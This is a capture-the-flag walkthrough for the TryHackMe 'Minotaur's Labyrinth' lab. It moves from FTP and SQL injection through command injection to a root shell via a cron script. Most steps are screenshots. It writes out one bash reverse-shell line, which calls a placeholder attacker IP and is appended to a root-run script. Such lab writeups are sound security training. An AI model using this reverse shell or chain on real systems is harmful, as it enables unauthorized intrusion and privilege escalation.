# Minotaur's Labyrinth TryHackMe Writeup
### Level: `Medium` | OS: `Linux`

![logo](1.png)

## Scanning
We run nmap on all ports with scripts and software versions.

![](2.png)

## Enumeration
In the nmap, we see that there is an *FTP* that can be accessed anonymously, we mount the ftp in our kali and list the first flag.

![](14.png)

We found the website, tried default credentials, but nothing.

![](3.png)

We reviewed the source code, found a few comments that might be useful (or fake). We are interested in the "**login.js**" file.

![](4.png)

#### Content of login.js file

![](5.png)

## Exploitation
We have a comment where comes the password of the user "**Daedalus**", we make the substitution of the arrays and we obtain the credentials.

![](6.png)

We check that the site is vulnerable to SQL Injection (Time-based).

![](8.png)

#### We obtain databases
![](9.png)

#### We obtain tables
![](10.png)

#### We obtain People columns
![](11.png)

We obtain the flat password using the hash.
![](12.png)

We access with the administrator credentials and find a flag.
![](13.png)

We find the secret section, we see that we can execute the **ECHO** command from this **PHP** application.

![](15.png)

#### Testing
![](16.png)

We tried to bypass it with `command`.

#### PoC
![](17.png)

#### Read /etc/passwd
![](18.png)

#### Reverse shell
We create a file with our reverse shell "*m3.sh*", download it with "**wget**" on the victim machine, give it execution permissions and execute it.

![](19.png)

#### Executing file m3.sh

![](20.png)

We check the version of python installed and configure the terminal to have a more interactive session.

![](21.png)

We are looking for the location of the remaining flags.

![](22.png)

#### Read user.txt file

![](23.png)

## Privilege Escalation
We see the following folder which is not common on a Linux system. Inside, there is a file with a script, it may be running from time to time.

![](25.png)

We download **pspy64**, run it and see how the user "*root (UID=0)*" is running the script every so often.

![](27.png)

We add the following line to the file "**timer.sh**" to get a shell with the user that executes the file.

```bash
echo "bash -i >& /dev/tcp/XX.XX.XX.XX/555 0>&1" >> timer.sh
```

We wait a few minutes and we will get a shell as root and read the flag.

![](26.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)